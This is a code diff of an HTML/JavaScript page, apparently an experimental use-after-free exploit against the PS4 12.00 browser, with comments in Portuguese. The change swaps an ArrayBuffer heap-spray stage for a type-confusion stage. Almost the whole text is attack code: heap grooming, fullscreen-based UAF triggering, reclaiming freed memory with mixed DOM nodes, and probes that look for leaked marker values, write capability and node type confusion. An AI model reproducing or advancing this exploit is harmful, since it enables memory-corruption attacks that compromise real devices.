@@ -2,17 +2,17 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Heap Overlap (Fixed Timing)</title>
+<title>PS4 12.00 - UAF Type Confusion Stage</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → Heap Overlap (Timing Fix)</h2>
+<h2>UAF → Type Confusion</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
 
 // ==========================
-// 🔒 LOG
+// 🔒 LOG SEGURO
 // ==========================
 let logBuffer = [];
 function log(msg){
@@ -21,7 +21,7 @@ function log(msg){
 }
 
 // ==========================
-// HEAP SETUP
+// HEAP SETUP (mantido)
 // ==========================
 function setupHeap(){
     for(let i=0;i<5000;i++){
@@ -31,9 +31,10 @@ function setupHeap(){
 }
 
 // ==========================
-// FULLSCREEN
+// FULLSCREEN (inalterado)
 // ==========================
 function setupFullscreen(){
+
     let fsTarget=document.createElement("div");
 
     fsTarget.innerHTML =
@@ -55,13 +56,15 @@ function setupFullscreen(){
 }
 
 // ==========================
-// 💣 RECLAIM
+// 💣 CONFUSION RECLAIM
 // ==========================
-function preciseReclaim(size){
-    log("[*] Reclaim size = "+size);
+function confusionReclaim(size){
+
+    log("[*] Confusion reclaim = "+size);
 
     let bucket=[];
 
+    // churn inicial
     for(let i=0;i<3000;i++){
         let el=document.createElement("div");
         document.body.appendChild(el);
@@ -72,28 +75,33 @@ function preciseReclaim(size){
 
         let el;
 
-        if(i % 10 !== 0){
-            el=document.createElement("div");
+        switch(i % 4){
 
-            el.innerHTML =
-                "<h1 style='margin-top:20%;text-align:center;'>CTRL_"+i+
-                "_41414141_42424242_43434343<br>Press OPTIONS</h1>";
-        }
-        else{
-            el=document.createTextNode("TXT_"+i+"_BBBB");
-            document.body.appendChild(el);
-            bucket.push(el);
-            continue;
-        }
+            case 0:
+                el=document.createElement("div");
+                el.innerHTML =
+                    "<h1>CTRL_"+i+"_41414141</h1>";
+                break;
 
-        Object.assign(el.style,{
-            background:"black",
-            width:"100%",
-            height:"100%",
-            position:"absolute",
-            top:"0",
-            left:"0"
-        });
+            case 1:
+                el=document.createTextNode(
+                    "TXT_"+i+"_BBBBBBBBBBBBBBBBBBBB"
+                );
+                document.body.appendChild(el);
+                bucket.push(el);
+                continue;
+
+            case 2:
+                el=document.createElement("svg");
+                el.innerHTML =
+                    "<circle cx='10' cy='10' r='5'></circle>";
+                break;
+
+            case 3:
+                el=document.createElement("div");
+                el.setAttribute("data-x","ATTR_"+i);
+                break;
+        }
 
         document.body.appendChild(el);
         bucket.push(el);
@@ -103,132 +111,75 @@ function preciseReclaim(size){
 }
 
 // ==========================
-// 🔥 ARRAYBUFFER SPRAY
+// 🔬 TYPE CONFUSION PROBE
 // ==========================
-let buffers=[];
+function typeProbe(fsTarget){
 
-function sprayArrayBuffers(count){
-
-    buffers=[];
-
-    for(let i=0;i<count;i++){
-
-        let buf=new ArrayBuffer(0x40); // 🔥 tamanho ajustado
-        let view=new Uint32Array(buf);
-
-        view[0]=0x41414141;
-        view[1]=0x42424242;
-        view[2]=0x43434343;
-
-        buffers.push(view);
-    }
-
-    log("[*] ArrayBuffer spray = "+buffers.length);
-}
-
-// ==========================
-// 🔬 PROBE
-// ==========================
-function deepProbe(fsTarget){
-
-    log("---- PROBE ----");
+    log("---- TYPE PROBE ----");
 
     try{
-        let html=fsTarget.innerHTML;
-        let txt=fsTarget.textContent;
 
-        log("[CHECK] innerHTML = "+html);
-        log("[CHECK] textContent = "+txt);
+        let node = fsTarget.firstChild;
 
-        if(html!==txt){
-            log("[!!!] DESYNC DETECTADO");
+        if(!node){
+            log("[!] sem child");
+            return;
         }
 
-    }catch(e){
-        log("[ERR] DOM read");
-    }
+        log("[CHECK] node = "+node);
+        log("[CHECK] nodeType = "+node.nodeType);
 
-    try{
-        let child=fsTarget.firstChild;
+        let isHTML = node instanceof HTMLElement;
+        let isSVG  = node instanceof SVGElement;
 
-        log("[CHECK] child = "+child);
+        log("[CHECK] HTMLElement = "+isHTML);
+        log("[CHECK] SVGElement = "+isSVG);
 
-        if(child){
-            let v=child.nodeValue || child.textContent;
-            log("[LEAK?] child data = "+v);
-
-            if(v && v.includes("41414141")){
-                log("[!!!] LEAK VIA CHILD");
-            }
+        // 🔥 DETECÇÕES IMPORTANTES
+        if(node.nodeType === 3){
+            log("[!!!] TEXTNODE REUSE");
         }
 
-    }catch(e){
-        log("[ERR] child crash");
-    }
-
-    try{
-        fsTarget.innerHTML="<div>BBBBBBBB</div>";
-        log("[PWN] write OK");
-
-        let after=fsTarget.innerHTML;
-        log("[CHECK] after write = "+after);
-
-        if(!after.includes("BBBB")){
-            log("[!!!] WRITE DESYNC");
+        if(isHTML && isSVG){
+            log("[!!!] TYPE CONFUSION REAL");
         }
 
-    }catch(e){
-        log("[PWN] write crash");
-    }
+        // 🔥 tentativa de escrita
+        try{
+            node.innerHTML = "<b>AAAA</b>";
+            log("[PWN] innerHTML write OK");
+        }catch(e){
+            log("[UAF] innerHTML crash");
+        }
 
-    // ======================
-    // 🔥 ARRAYBUFFER CHECK
-    // ======================
-    try{
+        // 🔥 acesso de layout (quebra comum)
+        try{
+            let r=node.getBoundingClientRect();
+            log("[CHECK] rect = "+r.height);
+        }catch(e){
+            log("[UAF] rect crash");
+        }
 
-        for(let i=0;i<buffers.length;i++){
+        // 🔥 leitura suspeita
+        try{
+            let v=node.textContent || node.nodeValue;
+            log("[LEAK?] data = "+v);
 
-            let v=buffers[i];
-
-            if(
-                v[0]!==0x41414141 ||
-                v[1]!==0x42424242 ||
-                v[2]!==0x43434343
-            ){
-                log("[!!!] CORRUPÇÃO FORTE buffer "+i);
-                log(
-                    v[0].toString(16)+","+
-                    v[1].toString(16)+","+
-                    v[2].toString(16)
-                );
-                break;
+            if(v && v.includes("4141")){
+                log("[!!!] POSSIVEL LEAK");
             }
 
-            if(v[3]!==0){
-                log("[!!!] POSSIVEL LEAK REAL");
-                log("[VAL3] "+v[3].toString(16));
-                break;
-            }
+        }catch(e){
+            log("[LEAK] crash");
         }
 
     }catch(e){
-        log("[CRASH] buffer read");
-    }
-
-    try{
-        log("[CHECK] parent = "+fsTarget.parentNode);
-    }catch(e){}
-
-    try{
-        let r=fsTarget.getBoundingClientRect();
-        log("[CHECK] rect = "+r.height);
-    }catch(e){
-        log("[UAF] rect crash");
+        log("[CRASH] type probe");
     }
 }
 
 // ==========================
-// 💥 TRIGGER (CORRIGIDO)
+// TRIGGER
 // ==========================
 function trigger(fsTarget){
 
@@ -243,24 +194,18 @@ function trigger(fsTarget){
 
     }catch(e){}
 
-    // 🔥 ORDEM CORRETA
+    // 🔥 múltiplos reclaim com tipos mistos
+    setTimeout(()=>confusionReclaim(2000), 0);
+    setTimeout(()=>confusionReclaim(2500), 50);
+    setTimeout(()=>confusionReclaim(3000), 100);
 
-    // 1. abrir slot (DOM)
-    setTimeout(()=>preciseReclaim(2000), 0);
-    setTimeout(()=>preciseReclaim(2200), 40);
+    // 🔬 probes
+    setTimeout(()=>typeProbe(fsTarget), 30);
+    setTimeout(()=>typeProbe(fsTarget), 90);
+    setTimeout(()=>typeProbe(fsTarget), 160);
+    setTimeout(()=>typeProbe(fsTarget), 240);
 
-    // 2. ocupar com heap real
-    setTimeout(()=>sprayArrayBuffers(4000), 80);
-
-    // 3. mistura final
-    setTimeout(()=>preciseReclaim(2500), 120);
-
-    // probes
-    setTimeout(()=>deepProbe(fsTarget), 60);
-    setTimeout(()=>deepProbe(fsTarget), 140);
-    setTimeout(()=>deepProbe(fsTarget), 220);
-
-    // log final
+    // 📜 log final
     setTimeout(()=>{
         alert(logBuffer.join("\n"));
     },400);
